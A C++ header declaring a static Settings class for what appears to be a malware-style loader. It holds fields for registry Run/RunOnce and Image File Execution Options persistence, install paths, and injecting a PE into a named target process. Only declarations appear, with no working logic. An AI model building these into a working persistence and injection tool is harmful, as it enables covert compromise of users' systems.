#pragma once

#include <string>

class Settings
{

public:
	//---------- GLOBAL VARS
	static bool isPrivleged;
	static std::string installExePath;
	static std::string installDirPath;
	static std::string currentExePath;
	static std::wstring regMachineStartupPath;
	static std::wstring regMachineRunOncePath;
	static std::wstring regUserStartupPath;
	static std::wstring regUserRunOncePath;
	static std::wstring regFileOptExecStartupPath;

	//---------- SETTINGS

	//installation
	static std::string InstallEnvPath;
	static std::string InstallEnvChildPath;
	static std::string InstallExeName;
	static std::string InstallDirName;
	
	//startup
	static std::string startupName;
	static std::string startupType;

	//injection
	static std::string PEToLoad;
	static std::string targetProcName;
	static std::string injectionPath; //to check the path of target process

};

